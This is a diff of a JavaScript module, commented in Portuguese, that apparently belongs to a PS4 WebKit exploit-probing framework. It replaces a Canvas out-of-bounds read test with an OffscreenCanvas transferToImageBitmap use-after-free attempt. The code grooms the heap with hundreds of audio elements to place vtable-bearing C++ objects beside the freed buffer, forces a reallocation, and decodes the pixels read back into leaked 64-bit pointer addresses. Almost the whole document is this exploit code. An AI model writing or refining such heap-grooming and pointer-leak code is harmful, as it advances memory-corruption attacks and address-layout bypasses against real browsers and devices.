@@ -1,96 +1,145 @@
+
 import { Groomer } from '../mod_groomer.js';
 
 export default {
-    id:       'CANVAS_IMAGEDATA_OOB',
+    id:       'CANVAS_OFFSCREEN_TRANSFER_UAF',
     category: 'Graphics',
     risk:     'CRITICAL',
     description:
-        'OOB Read na memória gráfica. O Canvas é encolhido síncronamente, mas a pintura ' +
-        'dos dados massivos prossegue. O Heap Feng Shui posiciona objetos HTML pesados ' +
-        '(elementos <audio>) adjacentes ao buffer libertado para extração de ponteiros C++ (vTables).',
+        'UAF / OOB via OffscreenCanvas.transferToImageBitmap(). ' +
+        'O backing store do OffscreenCanvas é transferido (ownership move) para um ImageBitmap. ' +
+        'Se o OffscreenCanvas for redimensionado síncronamente logo após o transfer, ' +
+        'o WebKit pode realocar o backing store enquanto o ImageBitmap ainda aponta ' +
+        'para o buffer original — criando uma janela UAF/dangling pointer. ' +
+        'O Heap Feng Shui com elementos <audio> posiciona estruturas C++ ricas em ' +
+        'vTable pointers adjacentes ao buffer libertado.',
 
     setup: function() {
         this.results = {};
         this.sandbox = document.getElementById('groomer-sandbox');
 
-        this.canvas = document.createElement('canvas');
-        this.canvas.width = 50;
-        this.canvas.height = 50;
-        this.sandbox.appendChild(this.canvas);
+        // OffscreenCanvas não precisa de estar no DOM
+        this.osc = new OffscreenCanvas(64, 64);
+        this.ctx = this.osc.getContext('2d');
 
-        this.ctx = this.canvas.getContext('2d', { willReadFrequently: true });
+        // Pinta um padrão completamente ZERO para baseline limpa
+        // Qualquer byte != 0 lido depois do transfer é candidato a leak
+        this.ctx.clearRect(0, 0, 64, 64);
 
-        // FIX: fill(0) em vez de fill(0x41).
-        // Agora qualquer byte ≠ 0 nos pixels lidos é candidato a leak genuíno —
-        // elimina falsos positivos causados por premultiplied alpha / color-space conversion.
-        this.toxicData = this.ctx.createImageData(50, 50);
-        this.toxicData.data.fill(0);
+        // Canvas visível auxiliar para drawImage do ImageBitmap
+        this.visCanvas = document.createElement('canvas');
+        this.visCanvas.width  = 64;
+        this.visCanvas.height = 64;
+        this.sandbox.appendChild(this.visCanvas);
+        this.visCtx = this.visCanvas.getContext('2d', { willReadFrequently: true });
     },
 
     trigger: function() {
         try {
-            // 1. GATILHO: Destrói o backing store do C++
-            this.canvas.width = 1;
+            // 1. TRANSFER — move o backing store do OffscreenCanvas para o ImageBitmap
+            //    Após este ponto, this.osc NÃO deve ter backing store válido
+            this.results.bitmap = this.osc.transferToImageBitmap();
 
-            // 2. HEAP FENG SHUI: Plantando alvos ricos em ponteiros vTable
+            // 2. HEAP FENG SHUI — preenche o buraco deixado pelo buffer transferido
+            //    com estruturas HTMLMediaElement ricas em ponteiros vTable C++
             this.pointerTargets = [];
-            for (let i = 0; i < 200; i++) {
+            for (let i = 0; i < 300; i++) {
                 let el = document.createElement('audio');
                 this.sandbox.appendChild(el);
                 this.pointerTargets.push(el);
             }
 
-            // 3. Força escrita cega sobre a memória libertada
-            this.ctx.putImageData(this.toxicData, 0, 0);
+            // 3. GATILHO DE REALLOC — força o OffscreenCanvas a realocar
+            //    síncronamente um NOVO backing store (potencialmente sobreposto)
+            this.osc.width  = 65; // dimensão ligeiramente diferente força realloc
+            this.osc.height = 65;
+            this.ctx = this.osc.getContext('2d');
+            this.ctx.clearRect(0, 0, 65, 65);
 
-            // 4. Lê 4 pixels (16 bytes = 2 ponteiros de 64-bits potenciais)
-            this.results.leaked = this.ctx.getImageData(0, 0, 4, 1);
+            // 4. LEITURA via ImageBitmap — se o bitmap ainda apontar para o buffer
+            //    antigo, o drawImage vai ler memória possivelmente reutilizada
+            this.visCtx.drawImage(this.results.bitmap, 0, 0);
+
+            // 5. Captura imediata — 8 pixels = 32 bytes = 4 ponteiros de 64-bits potenciais
+            this.results.leaked = this.visCtx.getImageData(0, 0, 8, 1);
+
         } catch(e) {
             this.results.error = e.message;
         }
     },
 
     probe: [
-        // Probe 0: Estado geral da operação
-        s => s.results.error || 'Pintura Gráfica Aceite',
+        // Probe 0: Estado geral
+        s => s.results.error || 'Transfer + Realloc aceite',
 
-        // Probe 1: Extrator de endereços (reconstrução numérica de 32-bits)
-        // FIX: check agora é apenas `r !== 0` (fill era 0, qualquer coisa diferente é suspeita).
-        // FIX: return 'Protegido' no else — elimina o `undefined` implícito anterior.
+        // Probe 1: Extrator de endereços — varre os 8 pixels (32 bytes)
         s => {
-            if (s.results.leaked) {
-                let data = s.results.leaked.data;
-                let r = data[0], g = data[1], b = data[2], a = data[3];
+            if (!s.results.leaked) return 'Sem dados lidos';
 
-                if (r !== 0 || g !== 0 || b !== 0 || a !== 0) {
-                    // Reconstrói metade de um ponteiro nativo (little-endian, 32-bits low half)
-                    let rawValue  = (a << 24) | (b << 16) | (g << 8) | r;
-                    let unsignedVal = rawValue >>> 0;
+            let data     = s.results.leaked.data; // Uint8ClampedArray, 32 bytes
+            let nonZero  = [];
+            let leakAddr = null;
 
-                    // Heurística de ponteiro PS4: espaço de utilizador FreeBSD AMD64
-                    // tipicamente em 0x00007F__________ — low 32-bits raramente são zero
-                    return `💥 LEAK C++ [Metade de Ponteiro]: 0x${unsignedVal.toString(16).toUpperCase()} (RGBA bruto: ${r},${g},${b},${a})`;
+            // Varre os 4 grupos de 8 bytes (4 potenciais ponteiros de 64-bits)
+            for (let ptr = 0; ptr < 4; ptr++) {
+                let base = ptr * 8;
+                // Low 32-bits (little-endian)
+                let lo = (data[base+3] << 24) | (data[base+2] << 16) |
+                         (data[base+1] <<  8) |  data[base+0];
+                // High 32-bits
+                let hi = (data[base+7] << 24) | (data[base+6] << 16) |
+                         (data[base+5] <<  8) |  data[base+4];
+
+                lo = lo >>> 0;
+                hi = hi >>> 0;
+
+                if (lo !== 0 || hi !== 0) {
+                    nonZero.push({ ptr, lo, hi });
+                    // Heurística: ponteiro de utilizador PS4 (FreeBSD AMD64)
+                    // high == 0x00007FFF ou similar (canonical user address)
+                    if (hi >= 0x00007F00 && hi <= 0x00007FFF) {
+                        leakAddr = `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
+                    }
                 }
-
-                // FIX: retorno explícito quando todos os bytes são zero
-                return 'Protegido / Buffer Nulo';
             }
 
-            // FIX: retorno explícito quando getImageData falhou
-            return 'Sem dados lidos';
+            if (leakAddr) {
+                return `💥 PONTEIRO C++ VAZADO: ${leakAddr}`;
+            }
+            if (nonZero.length > 0) {
+                let summary = nonZero.map(n =>
+                    `ptr[${n.ptr}]=0x${n.hi.toString(16)}${n.lo.toString(16)}`
+                ).join(' | ');
+                return `⚠️ Bytes não-nulos (possível leak): ${summary}`;
+            }
+            return 'Protegido / Apenas zeros';
+        },
+
+        // Probe 2: Raw dump dos primeiros 16 bytes para análise manual
+        s => {
+            if (!s.results.leaked) return 'N/A';
+            let d = s.results.leaked.data;
+            let hex = '';
+            for (let i = 0; i < 16; i++) {
+                hex += d[i].toString(16).padStart(2, '0') + ' ';
+            }
+            return `RAW[0..15]: ${hex.trim()}`;
         }
     ],
 
     cleanup: function() {
-        try { this.canvas.remove(); } catch(e){}
+        try {
+            if (this.results.bitmap) this.results.bitmap.close();
+        } catch(e) {}
+        try { this.visCanvas.remove(); } catch(e) {}
         if (this.pointerTargets) {
             this.pointerTargets.forEach(el => { try { el.remove(); } catch(e){} });
         }
         this.pointerTargets = null;
-        this.canvas         = null;
+        this.osc            = null;
         this.ctx            = null;
-        this.toxicData      = null;
+        this.visCanvas      = null;
+        this.visCtx         = null;
         this.results        = {};
     }
 };
-
